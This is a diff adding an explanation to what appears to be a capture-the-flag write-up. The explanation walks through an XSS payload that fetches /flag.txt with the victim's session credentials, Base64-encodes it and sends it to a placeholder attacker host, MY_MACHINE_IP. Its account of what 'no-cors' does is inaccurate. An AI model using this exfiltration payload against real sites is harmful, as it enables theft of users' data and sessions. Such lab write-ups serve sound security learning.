@@ -33,6 +33,32 @@ fetch("/flag.txt", {method:'GET',mode:'no-cors',credentials:'same-origin'})
 </script>
 
 ```
+---
+CODE EXPLENATION
+
+This JavaScript code is an example of data exfiltration, meaning unauthorized theft of information from a server. Here’s how it works:
+
+`fetch("/flag.txt", {method:'GET',mode:'no-cors',credentials:'same-origin'})`  
+Fetches the content of `/flag.txt` from the server.
+
+- `method: 'GET'` means it's a request to retrieve data.
+
+- `mode: 'no-cors'` disables standard Cross-Origin Resource Sharing (CORS) protection, making it harder to detect the attack.
+
+- `credentials: 'same-origin'` ensures that cookies and authentication credentials (like session tokens) are sent along with the request.
+
+`.then(response => response.text())` Waits for the server’s response and converts it into text.
+
+`.then(text => { fetch('http://MY_MACHINE_IP:80/' + btoa(text), {mode:'no-cors'}); });`
+
+- Once the `/flag.txt` content is retrieved, it is Base64 encoded `(btoa(text))`.
+
+- Then, the encoded data is sent to an external server `(http://MY_MACHINE_IP:80/)`, controlled by the attacker.
+
+- `mode: 'no-cors'` prevents the browser from blocking the request.
+
+END OF CODE EXPLENATION
+---
 
 ![py2](imgs/py2.png "py2")
 
